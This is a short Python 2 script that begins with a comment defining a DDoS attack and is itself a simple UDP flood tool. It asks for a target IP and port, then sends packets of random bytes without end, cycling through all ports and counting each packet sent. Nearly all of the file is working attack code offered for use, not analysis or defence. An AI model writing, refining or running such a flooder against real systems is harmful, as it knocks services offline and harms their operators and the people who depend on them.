##############
# Backstory, A Distributed Denial of Service (DDoS) attack is an attempt to make an online service unavailable
# by overwhelming it with traffic from multiple sources. 
# They target a wide variety of important resources from banks to news websites, 
# and present a major challenge to making sure people can publish and access important information
##############
import sys
import os
import time
import socket
import random
#code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
ip = raw_input("IP Target: ")
port = input("Port: ")
#############

sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
    if port == 65534:
        port = 1
